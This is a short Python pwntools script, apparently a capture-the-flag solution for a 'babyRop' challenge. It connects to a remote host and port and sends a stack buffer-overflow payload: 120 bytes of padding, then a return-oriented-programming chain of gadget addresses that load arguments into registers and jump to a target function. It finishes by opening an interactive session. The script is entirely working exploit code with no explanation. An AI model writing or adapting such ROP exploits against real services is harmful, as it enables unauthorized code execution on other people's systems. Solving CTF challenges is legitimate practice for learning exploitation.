from pwn import *

# p = process("./babyRop")
p = remote('3.101.12.127', 5002)

p.recvline()

callme = 0x0000000004011fb
ret = 0x00000000040101a
rdi = 0x00000000004012f3
rsi_r15 = 0x00000000004012f1
payload = b'a'*120 + p64(rdi) + p64(0xcafebabe)+ p64(rsi_r15) + p64(0xdeadbeef) + p64(0x0) + p64(callme)
print(payload)
p.sendline(payload)
p.interactive()